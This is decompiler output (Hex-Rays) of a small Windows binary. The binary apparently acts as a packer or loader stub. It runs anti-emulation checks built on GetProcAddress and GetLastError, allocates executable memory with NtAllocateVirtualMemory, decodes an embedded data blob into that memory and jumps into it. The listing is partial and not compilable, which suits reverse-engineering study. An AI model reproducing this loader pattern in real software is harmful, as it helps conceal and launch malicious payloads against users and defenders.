/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __stdcall sub_401000(int *a1, _BYTE *a2, int a3, _DWORD *a4);
// void __userpurge start(int a1@<ecx>, int *a2, _BYTE *a3, int a4, _DWORD *a5);
void __stdcall sub_401260(int *a1, _BYTE *a2, int a3, _DWORD *a4);
void sub_401268();
// void __cdecl qsort(void *Base, size_t NumOfElements, size_t SizeOfElements, _CoreCrtNonSecureSearchSortCompareFunction CompareFunction);
// size_t __cdecl strlen(const char *Str);
// NTSTATUS __stdcall NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
// DWORD __stdcall GetLastError();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_422000; // weak


//----- (00401000) --------------------------------------------------------
void __stdcall sub_401000(int *a1, _BYTE *a2, int a3, _DWORD *a4)
{
  int v4; // ecx

  if ( a3 )
  {
    v4 = *a1;
    LOBYTE(v4) = __CFADD__(~(unsigned __int8)*a4, 1) + *a2 - *a4;
    *a1 = 0;
    *a1 -= v4;
    *a1 = -*a1;
    JUMPOUT(0x401208);
  }
}
// 4010C3: control flows out of bounds to 401208

//----- (004010CF) --------------------------------------------------------
void __userpurge start(int a1@<ecx>, int *a2, _BYTE *a3, int a4, _DWORD *a5)
{
  int v5; // ecx
  unsigned int i; // [esp+54h] [ebp-1ACh]
  char v7; // [esp+58h] [ebp-1A8h] BYREF
  int v8; // [esp+68h] [ebp-198h] BYREF
  _DWORD *v9; // [esp+1D8h] [ebp-28h]
  ULONG_PTR RegionSize; // [esp+1DCh] [ebp-24h] BYREF
  PVOID BaseAddress; // [esp+1E0h] [ebp-20h] BYREF
  int *v12; // [esp+1E4h] [ebp-1Ch]
  unsigned int v13; // [esp+1E8h] [ebp-18h]
  char *v14; // [esp+1ECh] [ebp-14h]
  char Str[4]; // [esp+1F0h] [ebp-10h] BYREF
  unsigned int v16; // [esp+1F4h] [ebp-Ch]
  char *v17; // [esp+1F8h] [ebp-8h]
  int v18; // [esp+1FCh] [ebp-4h]

  v13 = 0;
  v5 = a1 + 1;
  do
    --v5;
  while ( v5 );
  strcpy(Str, "lua");
  v16 = 2829155;
  if ( strlen(Str) == 3 )
  {
    qsort(Str, 2u, 4u, (_CoreCrtNonSecureSearchSortCompareFunction)GetProcAddress);
    *(_DWORD *)Str -= 2829155;
    if ( !*(_DWORD *)Str && GetLastError() == 126 )
    {
      v13 = *(_DWORD *)Str;
      v18 &= *(_DWORD *)Str;
      __writeeflags(*(unsigned int *)Str);
      v16 = v13 + v13 + 4293074;
      *(_DWORD *)Str = &v7;
      v9 = &unk_422000;
      v12 = &v8;
      v18 -= 48;
      v18 = ~v18;
      ++v18;
      sub_401268();
      RegionSize = **(_DWORD **)Str + *(_DWORD *)(*(_DWORD *)Str + 4);
      v13 = 0;
      BaseAddress = 0;
      NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF, &BaseAddress, 0, &RegionSize, 0x3000u, 0x40u);
      v17 = (char *)BaseAddress;
      if ( BaseAddress )
      {
        BaseAddress = (PVOID)0x400000;
        for ( i = 0; i < *(_DWORD *)(*(_DWORD *)Str + 8); ++i )
        {
          sub_401260((int *)&v17[v13], (_BYTE *)BaseAddress + *v12, v12[1], v9);
          v13 += v12[1];
          v12 += 2;
        }
        v14 = v17 + 5424;
        __asm { retn    4 }
      }
      JUMPOUT(0xCF);
    }
  }
  sub_401000(a2, a3, a4, a5);
}
// 4012AA: control flows out of bounds to CF

//----- (00401260) --------------------------------------------------------
void __stdcall sub_401260(int *a1, _BYTE *a2, int a3, _DWORD *a4)
{
  sub_401000(a1, a2, a3, a4);
}

//----- (00401268) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_401268()
{
  int *v0; // [esp-10h] [ebp-10h]
  _BYTE *v1; // [esp-Ch] [ebp-Ch]
  int v2; // [esp-8h] [ebp-8h]
  _DWORD *v3; // [esp-4h] [ebp-4h]

  sub_401260(v0, v1, v2, v3);
  JUMPOUT(0x4011B1);
}
// 40126E: positive sp value 14 has been found
// 40126E: control flows out of bounds to 4011B1
// 401269: variable 'v0' is possibly undefined
// 401269: variable 'v1' is possibly undefined
// 401269: variable 'v2' is possibly undefined
// 401269: variable 'v3' is possibly undefined

// nfuncs=4 queued=4 decompiled=4 lumina nreq=0 worse=0 better=0
// ALL OK, 4 function(s) have been successfully decompiled
